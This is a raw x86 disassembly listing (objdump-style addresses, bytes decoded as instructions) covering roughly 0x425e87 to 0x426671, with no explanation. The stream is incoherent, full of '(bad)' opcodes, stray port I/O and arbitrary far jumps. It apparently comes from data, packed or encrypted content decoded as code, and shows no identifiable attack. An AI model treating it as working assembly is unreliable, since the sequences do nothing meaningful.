  425e87:	fidivr DWORD PTR [ecx-0x77]
  425e8a:	(bad)  
  425e8b:	mov    al,ds:0x846e1e1a
  425e90:	inc    edx
  425e91:	mov    al,BYTE PTR [edi]
  425e93:	test   DWORD PTR [edi+0x78],ecx
  425e96:	add    BYTE PTR [ebp-0x6c5de3ae],ch
  425e9c:	push   edi
  425e9d:	loopne 0x425e6d
  425e9f:	pop    es
  425ea0:	in     al,0xc2
  425ea2:	fisttp QWORD PTR [eax]
  425ea4:	push   0x15091402
  425ea9:	ss mov bl,0xcd
  425eac:	pusha  
  425ead:	repnz mov edi,0x4c16b8b2
  425eb3:	iret   
  425eb4:	(bad)  
  425eb5:	je     0x425ef6
  425eb7:	add    al,0x24
  425eb9:	fs mov ebp,edx
  425ebc:	jp     0x425f1b
  425ebe:	cld    
  425ebf:	mov    eax,ds:0x34a5e2f0
  425ec4:	(bad)  
  425ec5:	jns    0x425eb9
  425ec7:	xor    BYTE PTR [ebx+0x63],bh
  425eca:	add    DWORD PTR ds:0x9f3d2661,ebp
  425ed0:	xchg   edi,eax
  425ed1:	dec    edi
  425ed2:	je     0x425e9f
  425ed4:	pop    ecx
  425ed5:	mov    esp,0xfcfd985c
  425eda:	add    ebx,DWORD PTR [esi+ecx*4+0x64]
  425ede:	pop    es
  425edf:	stos   DWORD PTR es:[edi],eax
  425ee0:	cdq    
  425ee1:	(bad)  
  425ee2:	in     al,0x74
  425ee4:	pop    es
  425ee5:	sub    eax,0x2893b50b
  425eea:	dec    ebx
  425eeb:	jnp    0x425ec9
  425eed:	xchg   ecx,eax
  425eee:	sbb    al,0x50
  425ef0:	jae    0x425e91
  425ef2:	sar    DWORD PTR [ecx],1
  425ef4:	jge    0x425ed0
  425ef6:	setne  BYTE PTR [bp+0x2e]
  425efb:	ret    0x2824
  425efe:	cmp    eax,0xeb50b827
  425f03:	push   edx
  425f04:	mov    ecx,0xc6d7406e
  425f09:	and    ah,ah
  425f0b:	push   esp
  425f0c:	push   cs
  425f0d:	dec    esi
  425f0e:	xor    ebp,ebx
  425f10:	adc    bl,BYTE PTR [ebx+0x7006b0ad]
  425f16:	sub    BYTE PTR [edx+0x551ed6c3],al
  425f1c:	das    
  425f1d:	enter  0x4207,0xa4
  425f21:	out    dx,al
  425f22:	std    
  425f23:	sub    al,0x49
  425f25:	fsubr  st(5),st
  425f27:	add    DWORD PTR [ebp+0x36d12be8],0xffffffbf
  425f2e:	iret   
  425f2f:	shl    DWORD PTR [edi],cl
  425f31:	add    edi,DWORD PTR [ecx]
  425f33:	and    eax,0xb6865a71
  425f38:	xchg   edi,eax
  425f39:	and    al,BYTE PTR [ecx-0x2f4d7ff3]
  425f3f:	(bad)  
  425f40:	pop    edx
  425f41:	mov    al,ds:0xde850ce9
  425f46:	in     al,dx
  425f47:	addr16 popf 
  425f49:	mov    ?,WORD PTR [ebx]
  425f4b:	fwait
  425f4c:	sbb    eax,0x8207de57
  425f51:	adc    ch,BYTE PTR [edx]
  425f53:	xchg   DWORD PTR [edx-0x4e55d17c],esi
  425f59:	dec    edx
  425f5a:	mov    cl,0x61
  425f5c:	out    dx,eax
  425f5d:	in     al,0xe3
  425f5f:	not    BYTE PTR [edx-0x3b]
  425f62:	scas   eax,DWORD PTR es:[edi]
  425f63:	xchg   ebx,eax
  425f64:	aas    
  425f65:	and    edi,esp
  425f67:	sub    BYTE PTR [edi],dl
  425f69:	dec    esi
  425f6a:	push   0x2790b715
  425f6f:	fdivr  DWORD PTR gs:[ebx]
  425f72:	dec    ecx
  425f73:	call   0xb796:0xe26f0a4c
  425f7a:	pop    ds
  425f7b:	push   0x906494bd
  425f80:	fistp  WORD PTR [ebp+ebx*4-0x67346fcf]
  425f87:	ror    DWORD PTR [esi],1
  425f89:	not    BYTE PTR [ebp-0x3a]
  425f8c:	mov    bl,0x24
  425f8e:	xor    BYTE PTR [edi+0x1],0x7e
  425f92:	loop   0x425f94
  425f94:	cdq    
  425f95:	sbb    cl,0xd5
  425f98:	xor    al,0x89
  425f9a:	pop    ds
  425f9b:	ficom  DWORD PTR [ecx+edi*8+0x50]
  425f9f:	and    BYTE PTR [ebx],ah
  425fa1:	ds xchg ecx,eax
  425fa3:	int    0xeb
  425fa5:	xchg   ebp,eax
  425fa6:	mov    ah,dh
  425fa8:	adc    DWORD PTR ds:0xdee6dc3d,ebp
  425fae:	je     0x425fd4
  425fb0:	std    
  425fb1:	jmp    0x3694470
  425fb6:	rcr    BYTE PTR [eax],cl
  425fb8:	dec    ebx
  425fb9:	sbb    eax,0x16932e66
  425fbe:	out    0x5f,eax
  425fc0:	pop    esp
  425fc1:	xchg   sp,ax
  425fc3:	sub    BYTE PTR [ecx-0x55],dl
  425fc6:	fisub  DWORD PTR [esi+0x78668293]
  425fcc:	cmp    bl,BYTE PTR [ebp+0x4]
  425fcf:	cmp    ecx,DWORD PTR [esp+edx*4-0x77]
  425fd3:	sbb    al,0x5
  425fd5:	jno    0x425ffc
  425fd7:	inc    edx
  425fd8:	fldenv [ebp-0x17fa2cc0]
  425fde:	fiadd  WORD PTR [edx]
  425fe0:	shl    DWORD PTR [edi+0x1c],0xb6
  425fe4:	(bad)  
  425fe5:	mov    WORD PTR cs:[esi+0x17],ss
  425fe9:	loopne 0x42601a
  425feb:	fistp  QWORD PTR [ebx-0x36ec8260]
  425ff1:	push   ds
  425ff2:	sub    BYTE PTR [ebx+0x32],dh
  425ff5:	sbb    dl,ah
  425ff7:	fimul  DWORD PTR [ecx]
  425ff9:	push   edi
  425ffa:	push   es
  425ffb:	add    al,0x25
  425ffd:	sbb    BYTE PTR [esi+0x72],al
  426000:	cmp    eax,0x27d2a70e
  426005:	div    DWORD PTR [edi-0x35]
  426008:	push   ebx
  426009:	leave  
  42600a:	mov    al,ds:0xb6c1d25d
  42600f:	sub    al,0x99
  426011:	pop    eax
  426012:	push   ds
  426013:	xchg   esp,eax
  426014:	jb     0x42603c
  426016:	inc    edx
  426017:	or     ch,BYTE PTR [eax]
  426019:	(bad)  
  42601a:	push   ss
  42601b:	adc    eax,0x8b8ef09a
  426020:	sbb    DWORD PTR [edi+0x5b],eax
  426023:	fcom   QWORD PTR [edi+edx*4-0x70]
  426027:	(bad)  
  426029:	mov    esi,ebp
  42602b:	mov    bl,0xe
  42602d:	(bad)  
  42602e:	push   0xa12a5aa3
  426033:	inc    esi
  426034:	or     DWORD PTR [edx+0x5e],edi
  426037:	ror    BYTE PTR [edi+0x6f3a6f77],1
  42603d:	fcomp  QWORD PTR [ebx-0x299e31e9]
  426043:	repnz or al,BYTE PTR [edx-0x6868da34]
  42604a:	xor    eax,0xa9318f91
  42604f:	idiv   DWORD PTR [eax-0x57]
  426052:	inc    ecx
  426053:	icebp  
  426054:	inc    esp
  426055:	ins    BYTE PTR es:[edi],dx
  426056:	push   ebp
  426057:	adc    esp,eax
  426059:	adc    eax,0xf643cefc
  42605e:	aas    
  42605f:	mov    ds:0x70571bc2,eax
  426064:	dec    ebx
  426065:	pop    ds
  426066:	adc    DWORD PTR [edx+0x33],0xffffff8f
  42606a:	nop
  42606b:	lock ret 0xaa18
  42606f:	aad    0xac
  426071:	mov    DWORD PTR [edi],edx
  426073:	mov    ds:0xcdcb0ccb,eax
  426078:	test   eax,0x4005cb2e
  42607d:	push   cs
  42607e:	push   ebp
  42607f:	pop    ds
  426080:	mov    edi,0x47b02b39
  426085:	sbb    DWORD PTR [esi+0x3d],ebp
  426088:	adc    cl,BYTE PTR [esi+ebp*4+0x1a]
  42608c:	mov    ebp,0x18335074
  426091:	sahf   
  426092:	push   edx
  426093:	cmovg  edi,DWORD PTR [esi+ebx*4]
  426097:	sbb    BYTE PTR [ecx],ah
  426099:	stos   BYTE PTR es:[edi],al
  42609a:	dec    BYTE PTR ds:0x112153b7
  4260a0:	pop    esp
  4260a1:	jo     0x4260a7
  4260a3:	jmp    0x42605d
  4260a5:	cmp    eax,0x918f6ff2
  4260aa:	mov    ds:0x80f0da39,al
  4260af:	cmp    eax,0x35849305
  4260b4:	inc    ebp
  4260b5:	ins    BYTE PTR es:[edi],dx
  4260b6:	mov    eax,0x743eb794
  4260bb:	and    al,0x7d
  4260bd:	xchg   esi,eax
  4260be:	in     al,0x27
  4260c0:	out    0xcc,eax
  4260c2:	add    DWORD PTR [edi],edx
  4260c4:	seta   BYTE PTR [edx]
  4260c7:	into   
  4260c8:	mov    ch,0xfe
  4260ca:	jbe    0x4260ba
  4260cc:	sub    BYTE PTR [edi-0x5a592e74],ah
  4260d2:	inc    ecx
  4260d3:	xor    DWORD PTR [edx+0x62b7d7],eax
	...
  4260e1:	sbb    ch,al
  4260e3:	mov    ebx,esp
  4260e5:	sti    
  4260e6:	call   FWORD PTR [edi-0x12]
  4260e9:	dec    edx
  4260ea:	pop    esi
  4260eb:	popa   
  4260ec:	sub    esp,DWORD PTR [edi+0x42ea5fd1]
  4260f2:	fadd   DWORD PTR [ecx]
  4260f4:	add    BYTE PTR [edi+0x35000003],ch
  4260fa:	pop    edx
  4260fb:	enter  0x343f,0xe5
  4260ff:	cmp    edi,DWORD PTR [esi+edi*4+0x5b]
  426103:	pop    ds
  426104:	xchg   edi,eax
  426105:	scas   al,BYTE PTR es:[edi]
  426106:	dec    edx
  426107:	jg     0x426126
  426109:	jae    0x42613c
  42610b:	and    dh,BYTE PTR [ebx]
  42610d:	mov    al,0x51
  42610f:	push   eax
  426110:	in     eax,0x5
  426112:	pop    eax
  426113:	sbb    DWORD PTR [ebx+ebp*2],ebp
  426116:	stc    
  426117:	push   edi
  426118:	iret   
  426119:	lahf   
  42611a:	xchg   edi,eax
  42611b:	adc    DWORD PTR [edx],eax
  42611d:	mov    esp,0x26592d1f
  426122:	(bad)  
  426123:	jp     0x426141
  426125:	jo     0x4260a9
  426127:	mov    eax,ds:0x43a8dc33
  42612c:	imul   ebp,DWORD PTR [ebx],0x76
  42612f:	xchg   ebp,eax
  426130:	mov    gs,WORD PTR [ecx-0x53]
  426133:	jnp    0x4260f4
  426135:	pop    edx
  426136:	in     eax,0x81
  426138:	jmp    0x9e06:0xf9155c3e
  42613f:	cmp    eax,0x7c458e50
  426144:	xor    al,0x89
  426146:	aam    0x29
  426148:	outs   dx,DWORD PTR ds:[esi]
  426149:	add    ch,al
  42614b:	xchg   edx,eax
  42614c:	(bad)  
  42614e:	add    al,0x54
  426150:	sbb    ebp,ecx
  426152:	sbb    esi,eax
  426154:	mov    ebx,0xb3488981
  426159:	jno    0x4261d3
  42615b:	push   edx
  42615c:	lods   eax,DWORD PTR ds:[esi]
  42615d:	sub    BYTE PTR [edx],bh
  42615f:	fisttp QWORD PTR [eax]
  426161:	cmp    al,0x3
  426163:	push   eax
  426164:	mov    ds:0xea1b5c57,eax
  426169:	int    0x9b
  42616b:	outs   dx,DWORD PTR ds:[esi]
  42616c:	push   eax
  42616d:	idiv   esp
  42616f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426170:	xor    cl,BYTE PTR ds:0xf88da7c7
  426176:	popa   
  426177:	retf   
  426178:	fmulp  st(6),st
  42617a:	pop    esp
  42617b:	fadd   QWORD PTR [ebx+0x2d177f8e]
  426181:	addr16 fwait
  426183:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426185:	adc    BYTE PTR [ecx],al
  426187:	adc    ebp,DWORD PTR [edi-0x38699a84]
  42618d:	out    dx,eax
  42618e:	iret   
  42618f:	aam    0x8f
  426191:	aas    
  426192:	sub    edx,esp
  426194:	shl    BYTE PTR [edx],cl
  426196:	ficomp DWORD PTR [ecx-0x39847926]
  42619c:	and    al,0xb4
  42619e:	sbb    eax,0xb99096f4
  4261a3:	jbe    0x42620d
  4261a5:	popf   
  4261a6:	int    0xcf
  4261a8:	mov    al,ds:0x2dcf8b6e
  4261ad:	mov    ds:0xe28334d,eax
  4261b2:	retf   
  4261b3:	or     eax,eax
  4261b5:	stc    
  4261b6:	lahf   
  4261b7:	mov    BYTE PTR [ebx-0x704fed96],bh
  4261bd:	xchg   ecx,eax
  4261be:	jge    0x4261a0
  4261c0:	pop    ss
  4261c1:	int3   
  4261c2:	jmp    0xad6e:0x6b7d6819
  4261c9:	jmp    0x426168
  4261cb:	xor    BYTE PTR [ebx+0x37ec2c18],0x31
  4261d2:	or     ah,ah
  4261d4:	adc    bh,BYTE PTR [ecx]
  4261d6:	fisubr DWORD PTR ds:0x921ce606
  4261dc:	in     al,0x11
  4261de:	cdq    
  4261df:	shl    DWORD PTR [edi],cl
  4261e1:	mov    dl,al
  4261e3:	adc    ecx,DWORD PTR [edx+0xc]
  4261e6:	xor    DWORD PTR [edi-0x6a],esp
  4261e9:	or     DWORD PTR [ebp-0x65eba60],0xffffffbe
  4261f0:	pop    ebp
  4261f1:	popf   
  4261f2:	mov    bl,0x33
  4261f4:	pusha  
  4261f5:	je     0x426241
  4261f7:	jo     0x4261a8
  4261f9:	pop    ecx
  4261fa:	mov    ds:0x880bdcdc,eax
  4261ff:	data16 lods al,BYTE PTR gs:[esi]
  426202:	pop    esi
  426203:	mul    DWORD PTR [edi+0x35]
  426206:	stos   DWORD PTR es:[edi],eax
  426207:	pop    esi
  426208:	mov    edx,0x4ac3d4b1
  42620d:	adc    DWORD PTR [ecx+0x3e],eax
  426210:	out    0x67,eax
  426212:	sar    DWORD PTR [ebx-0x7f],cl
  426215:	sbb    eax,ecx
  426217:	fiadd  WORD PTR ds:0xa4cb5f9
  42621d:	sbb    al,0xcc
  42621f:	add    ebx,ecx
  426221:	jg     0x426298
  426223:	out    0x46,eax
  426225:	test   al,0x34
  426227:	lea    edi,[esi+0x2b]
  42622a:	dec    esi
  42622b:	jo     0x4261e2
  42622d:	and    dl,dh
  42622f:	mov    ds:0x79fe4445,al
  426234:	jg     0x426238
  426236:	cmp    eax,0x86cf70c0
  42623b:	push   ds
  42623c:	ja     0x426217
  42623e:	aaa    
  42623f:	cmp    DWORD PTR [ebx+edi*2-0x5791c6ef],ebx
  426246:	fiadd  DWORD PTR ds:[edx+edx*1-0x428949]
  42624e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426250:	xor    al,0x54
  426252:	push   es
  426253:	aas    
  426254:	push   edx
  426255:	fistp  DWORD PTR [esi+0x45f16f04]
  42625b:	sahf   
  42625c:	inc    DWORD PTR [edi-0x5]
  42625f:	out    0x2c,al
  426261:	fstp   TBYTE PTR [eax+0x4a851f4f]
  426267:	and    al,0x1
  426269:	push   edi
  42626a:	repnz test al,0x86
  42626d:	push   0x3b
  42626f:	sti    
  426270:	jecxz  0x42625e
  426272:	loop   0x42629d
  426274:	fsub   st(7),st
  426276:	popa   
  426277:	popa   
  426278:	fistp  WORD PTR [ebx+0x6]
  42627b:	jle    0x42620e
  42627d:	jo     0x42628f
  42627f:	pop    es
  426280:	imul   esi,DWORD PTR [eax],0xffffffd8
  426283:	adc    edi,DWORD PTR [edx+edi*1]
  426286:	shl    DWORD PTR [edi+ecx*2+0xdcedd88],cl
  42628d:	jb     0x42621c
  42628f:	jmp    0x652bbe68
  426294:	scas   eax,DWORD PTR es:[edi]
  426295:	and    DWORD PTR [edx],ebp
  426297:	or     al,0xb8
  426299:	into   
  42629a:	cld    
  42629b:	xlat   BYTE PTR ds:[ebx]
  42629c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42629d:	(bad)
  4262a0:	mov    ecx,0x6d91482e
  4262a5:	xor    eax,0xc5870f76
  4262aa:	and    ebp,DWORD PTR [ecx]
  4262ac:	jno    0x426314
  4262ae:	in     al,0x64
  4262b0:	xor    edi,DWORD PTR [edx]
  4262b2:	fbld   TBYTE PTR [ebx]
  4262b4:	aam    0x1c
  4262b6:	(bad)  
  4262b7:	push   ss
  4262b8:	mov    edi,0xb64897b0
  4262bd:	jge    0x4262ef
  4262bf:	xor    esp,DWORD PTR [edi+0x54]
  4262c2:	ins    DWORD PTR es:[edi],dx
  4262c3:	fs adc eax,0x1ec982c
  4262c9:	dec    esi
  4262ca:	in     al,dx
  4262cb:	xchg   edi,eax
  4262cc:	mov    ebx,0xd2827108
  4262d1:	mov    edi,0x3375f7ad
  4262d6:	in     eax,dx
  4262d7:	jmp    0xbc98:0xbf77097c
  4262de:	cmp    al,0xcc
  4262e0:	(bad)  
  4262e1:	loop   0x4262bc
  4262e3:	sbb    bl,BYTE PTR ds:0x11cbf30b
  4262e9:	fs sub al,0x1e
  4262ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262ed:	inc    ecx
  4262ee:	mul    BYTE PTR [ecx+0x29]
  4262f1:	cmp    ebx,DWORD PTR es:[ebx+eax*1-0x53]
  4262f6:	push   DWORD PTR [edx+0x3217cb92]
  4262fc:	and    edx,eax
  4262fe:	lods   al,BYTE PTR ds:[esi]
  4262ff:	cmp    DWORD PTR [ecx],0x43
  426302:	cmp    BYTE PTR [edi],bl
  426304:	data16 mov al,0x7f
  426307:	jmp    0xb3a6:0x19fcfe27
  42630e:	add    DWORD PTR [esi+0x1e8071d2],edi
  426314:	mov    ds:0x8f337be4,al
  426319:	test   eax,0xd65b0d9
  42631e:	push   ebp
  42631f:	(bad)  [esi+0x3f]
  426322:	stos   DWORD PTR es:[edi],eax
  426323:	lea    esi,[edx]
  426325:	mov    bh,0xa6
  426327:	jp     0x42639b
  426329:	and    BYTE PTR [ebp-0xf],ch
  42632c:	or     DWORD PTR [ebx+0xc],esi
  42632f:	pop    esi
  426330:	cmp    ah,al
  426332:	pop    ebp
  426333:	mov    dh,0x43
  426335:	pop    edi
  426336:	cmp    eax,0x59701ae2
  42633b:	lea    esi,[ecx]
  42633d:	outs   dx,BYTE PTR ds:[esi]
  42633e:	fstp   QWORD PTR [edi]
  426340:	je     0x426364
  426342:	bound  edx,QWORD PTR [ecx-0x599300a4]
  426348:	test   BYTE PTR [ebx+0x47e4ae37],ah
  42634e:	mov    ah,0x8a
  426350:	ret    0x219d
  426353:	jbe    0x4263c5
  426355:	mov    esi,0x5caba401
  42635a:	dec    esi
  42635b:	and    al,0xc3
  42635d:	test   BYTE PTR [edx],bh
  42635f:	mov    ebx,0x4594194a
  426364:	in     eax,dx
  426365:	fnstsw WORD PTR [ecx]
  426367:	out    0xb0,eax
  426369:	mov    edi,DWORD PTR [ecx-0x646eeca2]
  42636f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426370:	and    DWORD PTR [eax+0x74],edi
  426373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426374:	aam    0x0
  426376:	fscale 
  426378:	es xchg esp,eax
  42637a:	inc    ecx
  42637b:	(bad)  
  42637c:	pop    ds
  42637d:	enter  0x37d2,0xc0
  426381:	xchg   esp,eax
  426382:	iret   
  426383:	mov    ecx,0x2c64578e
  426388:	mov    ds:0x9ea5c458,eax
  42638d:	mov    eax,ds:0x57196e15
  426392:	std    
  426393:	lea    esp,[ebx-0x23]
  426396:	int3   
  426397:	retf   
  426398:	sub    BYTE PTR [ebp+0x500d85b0],bl
  42639e:	sub    BYTE PTR [edi],bl
  4263a0:	lds    ecx,FWORD PTR [esi-0x2d5025df]
  4263a6:	dec    eax
  4263a7:	cmp    DWORD PTR [ecx+0x3e],edi
  4263aa:	loope  0x4263e5
  4263ac:	in     eax,0x47
  4263ae:	jmp    0x94816e5
  4263b3:	lock jbe 0x42640e
  4263b6:	les    edi,FWORD PTR [ecx+0x2a]
  4263b9:	pop    ebp
  4263ba:	pop    esp
  4263bb:	mov    WORD PTR [ebx+eiz*4],cs
  4263be:	dec    ecx
  4263bf:	and    al,0xab
  4263c1:	pop    ebp
  4263c2:	mov    ch,0x44
  4263c4:	sbb    al,0xc9
  4263c6:	daa    
  4263c7:	mov    ds,WORD PTR [edx+0x3e]
  4263ca:	xchg   DWORD PTR ss:[ebx-0x211bc024],edx
  4263d1:	scas   al,BYTE PTR es:[edi]
  4263d2:	gs ret 
  4263d4:	and    DWORD PTR [eax-0x7e],0xd31a04a8
  4263db:	or     BYTE PTR [ebx+ecx*1-0x34ef79c2],dl
  4263e2:	jb     0x4263d9
  4263e4:	mov    eax,0x97a77b97
  4263e9:	shr    DWORD PTR [ecx],cl
  4263eb:	jg     0x4263fc
  4263ed:	and    BYTE PTR [edx+0x58],al
  4263f0:	arpl   cx,bx
  4263f2:	jae    0x426413
  4263f4:	and    dl,BYTE PTR [ebx]
  4263f6:	xchg   BYTE PTR [eax],ah
  4263f8:	out    0xf8,eax
  4263fa:	and    ebx,edi
  4263fc:	jmp    0x4263a2
  4263fe:	adc    ch,BYTE PTR [edi]
  426400:	dec    eax
  426401:	lods   al,BYTE PTR ds:[esi]
  426402:	enter  0x45ab,0x5a
  426406:	mov    ds:0xb611bdda,al
  42640b:	loop   0x42642b
  42640d:	dec    esp
  42640e:	test   BYTE PTR [esp+ebp*1],0x20
  426412:	sbb    ah,BYTE PTR [ebp-0x61]
  426415:	jnp    0x42647f
  426417:	outs   dx,DWORD PTR ds:[esi]
  426418:	sub    dl,BYTE PTR [ebx+0x12]
  42641b:	lds    edi,FWORD PTR [ecx]
  42641d:	cli    
  42641e:	mov    ah,0x4f
  426420:	leave  
  426421:	shl    DWORD PTR [eax-0x58d0ac30],0x8a
  426428:	adc    esi,ecx
  42642a:	retf   
  42642b:	mov    esp,DWORD PTR [edi]
  42642d:	or     bl,BYTE PTR [ebp+0x5cd2d83c]
  426433:	js     0x426452
  426435:	xchg   edi,eax
  426436:	dec    esp
  426437:	in     al,dx
  426438:	push   ds
  426439:	adc    eax,0x658f932a
  42643e:	fcom   QWORD PTR [ebx-0x7402c6fe]
  426444:	jp     0x4263e1
  426446:	into   
  426447:	dec    edi
  426448:	jle    0x426472
  42644a:	jns    0x42646f
  42644c:	dec    esi
  42644d:	mov    es,WORD PTR [edx-0x3347561f]
  426453:	jle    0x4264bc
  426455:	jae    0x4263fb
  426457:	dec    ebp
  426458:	cmp    bh,BYTE PTR [esi+0x4a]
  42645b:	and    DWORD PTR [eax-0x443de0f9],eax
  426461:	test   al,0x4d
  426463:	mov    al,0xce
  426465:	out    0xa,al
  426467:	in     al,0x4
  426469:	popa   
  42646a:	push   edx
  42646b:	or     esi,DWORD PTR [ebp+0x4878b365]
  426471:	or     ebx,ecx
  426473:	repnz in al,0xdd
  426476:	sub    BYTE PTR [eax+0x68513771],0xa0
  42647d:	aam    0x2b
  42647f:	dec    edi
  426480:	sahf   
  426481:	cdq    
  426482:	xor    ah,BYTE PTR [esp+edx*2]
  426485:	sub    BYTE PTR [ebp+0x11],0xfb
  426489:	mov    ds,WORD PTR [ebx]
  42648b:	mov    di,0x4483
  42648f:	popa   
  426490:	mov    esi,0x7a5ceba4
  426495:	xor    ebp,DWORD PTR [ebp-0x24]
  426498:	rcr    bl,cl
  42649a:	xor    ebx,DWORD PTR [ecx+0x2e3071fc]
  4264a0:	mov    esp,0xce885069
  4264a5:	add    eax,0xac
  4264aa:	add    BYTE PTR [eax],al
  4264ac:	add    BYTE PTR [eax],al
  4264ae:	add    BYTE PTR [eax],al
  4264b0:	add    dl,ah
  4264b2:	jnp    0x426505
  4264b4:	data16 fldcw WORD PTR [esi-0x9]
  4264b8:	dec    DWORD PTR [eax+0x6f]
  4264bb:	std    
  4264bc:	or     edi,DWORD PTR [ebp-0x7a]
  4264bf:	(bad)  
  4264c0:	retf   0xdbf1
  4264c3:	add    DWORD PTR [eax],eax
  4264c5:	scas   eax,DWORD PTR es:[edi]
  4264c6:	add    eax,DWORD PTR [eax]
  4264c8:	add    BYTE PTR ds:0x3e033000,dl
  4264ce:	stos   BYTE PTR es:[edi],al
  4264cf:	adc    BYTE PTR [ebp+0x349adcad],dh
  4264d5:	jns    0x4264a2
  4264d7:	stos   BYTE PTR es:[edi],al
  4264d8:	(bad)  
  4264d9:	push   cs
  4264da:	pusha  
  4264db:	sahf   
  4264dc:	mov    esp,edx
  4264de:	xchg   esp,eax
  4264df:	clc    
  4264e0:	adc    cl,ch
  4264e2:	imul   ebp,DWORD PTR [ebx],0x9ad837cb
  4264e8:	push   eax
  4264e9:	cmp    ch,BYTE PTR [ecx-0x6f3fa662]
  4264ef:	(bad)  
  4264f0:	fsubp  st(0),st
  4264f2:	sub    BYTE PTR [edi],ah
  4264f4:	ret    
  4264f5:	fistp  WORD PTR [edi+esi*2]
  4264f8:	pop    ds
  4264f9:	icebp  
  4264fa:	jmp    0x12d492bd
  4264ff:	aas    
  426500:	mov    esi,0xeb5d54e5
  426505:	sub    BYTE PTR [ebp-0x7e928d97],0xf1
  42650c:	pusha  
  42650d:	push   edx
  42650e:	bound  ebp,QWORD PTR [esi]
  426510:	jge    0x426566
  426512:	mov    ch,0x31
  426514:	adc    bl,cl
  426516:	scas   eax,DWORD PTR es:[edi]
  426517:	sbb    eax,0xd01b969a
  42651c:	mov    DWORD PTR [edx+0x34ad1ec6],edi
  426522:	sub    BYTE PTR [edx],al
  426524:	repnz fld QWORD PTR [edi-0x7f]
  426529:	pop    ecx
  42652a:	je     0x4264ca
  42652c:	fadd   st(4),st
  42652e:	jno    0x42657e
  426530:	mov    esi,0x1abf33e7
  426535:	std    
  426536:	mov    cl,0xc2
  426538:	sub    ebp,DWORD PTR [edi-0x42]
  42653b:	idiv   BYTE PTR [ecx-0xc5e76a5]
  426541:	push   ss
  426542:	mov    ebx,0x35096ef6
  426547:	add    BYTE PTR [eax-0x68],0x9a
  42654b:	xlat   BYTE PTR ds:[ebx]
  42654c:	push   0xffffffb7
  42654e:	or     dl,ch
  426550:	xchg   edx,eax
  426551:	jno    0x426594
  426553:	jae    0x4264e4
  426555:	sbb    dh,BYTE PTR [esi+0x2b]
  426558:	jb     0x42655a
  42655a:	mov    cl,0x2
  42655c:	retf   
  42655d:	cmp    esp,DWORD PTR [eax+0x268c5d1b]
  426563:	rcl    ah,0xf5
  426566:	pop    eax
  426567:	adc    al,0x9c
  426569:	int    0xf9
  42656b:	xchg   ebx,eax
  42656c:	mov    DWORD PTR [ebx-0x7e],ecx
  42656f:	test   BYTE PTR [esi-0x51],ch
  426572:	sub    al,0x11
  426574:	out    dx,eax
  426575:	cli    
  426576:	xchg   DWORD PTR [edx+0x12b7f2d4],ecx
  42657c:	inc    DWORD PTR [edx+0x240e868e]
  426582:	mov    esi,0x15fe3be6
  426587:	sub    edx,DWORD PTR [ebx-0x4a]
  42658a:	push   ds
  42658b:	test   eax,0x9d1c9f83
  426590:	mov    esi,0x5720ad68
  426595:	pusha  
  426596:	pop    ss
  426597:	add    eax,0xd0ffb0a5
  42659c:	dec    ebp
  42659d:	push   edi
  42659e:	ins    BYTE PTR es:[edi],dx
  42659f:	adc    DWORD PTR [ebp-0xe],0x6f
  4265a3:	jmp    0x499d6018
  4265a8:	inc    ecx
  4265a9:	mov    WORD PTR [ebp+0x30bd41dd],ss
  4265af:	xchg   esp,eax
  4265b0:	test   edx,ebx
  4265b2:	xchg   esi,eax
  4265b3:	repnz (bad) 
  4265b5:	xor    eax,0x16365dc4
  4265ba:	cmp    edi,DWORD PTR [edx-0x6d523f12]
  4265c0:	int    0xb
  4265c2:	icebp  
  4265c3:	stos   BYTE PTR es:[edi],al
  4265c4:	lea    ebx,[edi+0x7b]
  4265c7:	(bad)  
  4265c8:	mov    edx,0xce32187a
  4265cd:	maskmovq mm5,(bad)
  4265ce:	imul   DWORD PTR [esi-0x3b]
  4265d1:	out    dx,eax
  4265d2:	inc    esi
  4265d3:	pop    esp
  4265d4:	or     ecx,DWORD PTR [ecx+0x71434432]
  4265da:	mov    eax,ds:0x5845691a
  4265df:	(bad)  
  4265e1:	clc    
  4265e2:	jbe    0x42664c
  4265e4:	outs   dx,DWORD PTR ds:[esi]
  4265e5:	mov    ch,0x87
  4265e7:	(bad)  
  4265e8:	fs pop ss
  4265ea:	popa   
  4265eb:	fldcw  WORD PTR [ebx+eiz*1-0x79e82b74]
  4265f2:	dec    esi
  4265f3:	ret    
  4265f4:	xchg   edi,eax
  4265f5:	push   ds
  4265f6:	cmp    bh,dh
  4265f8:	xchg   ecx,eax
  4265f9:	stc    
  4265fa:	add    esp,DWORD PTR [esp+ebp*1]
  4265fd:	or     al,0x10
  4265ff:	or     ecx,ebx
  426601:	ins    DWORD PTR es:[edi],dx
  426602:	mov    bh,0xf0
  426604:	push   ebp
  426605:	lds    ebp,FWORD PTR [ebp+0x67]
  426608:	stos   BYTE PTR es:[edi],al
  426609:	addr16 pop ss
  42660b:	cmp    BYTE PTR ds:0x6472ecc1,0x6a
  426612:	test   DWORD PTR [eax],0x1c17bb69
  426618:	mov    al,BYTE PTR [eax]
  42661a:	hlt    
  42661b:	mov    ebp,0x7fd96c49
  426620:	sub    dl,BYTE PTR [edi-0x5e]
  426623:	fwait
  426624:	or     al,0x1f
  426626:	stos   BYTE PTR es:[edi],al
  426627:	aam    0xe6
  426629:	cmc    
  42662a:	fiadd  DWORD PTR [edx-0x28c1c897]
  426630:	dec    esp
  426631:	lds    esp,FWORD PTR ds:0xd2b9ef25
  426637:	cwde   
  426638:	and    DWORD PTR [eax],edi
  42663a:	pop    ebx
  42663b:	lea    edx,[eax+0x6ab9b44a]
  426641:	aad    0xb6
  426643:	xchg   DWORD PTR [edx-0x3cde0185],esi
  426649:	lods   al,BYTE PTR ds:[esi]
  42664a:	mov    bh,0x97
  42664c:	in     al,0xee
  42664e:	les    edx,FWORD PTR [edi-0x2f6914be]
  426654:	jb     0x4265f1
  426656:	push   ecx
  426657:	imul   edx,DWORD PTR [esi+0x63],0x1152e8b3
  42665e:	dec    esp
  42665f:	cs (bad) 
  426661:	sbb    al,0x90
  426663:	jge    0x42664b
  426665:	inc    edx
  426666:	iret   
  426667:	adc    ecx,esi
  426669:	fistp  WORD PTR [eax-0x63c7ad51]
  42666f:	(bad)  
  426670:	sti    
  426671:	pop    edx
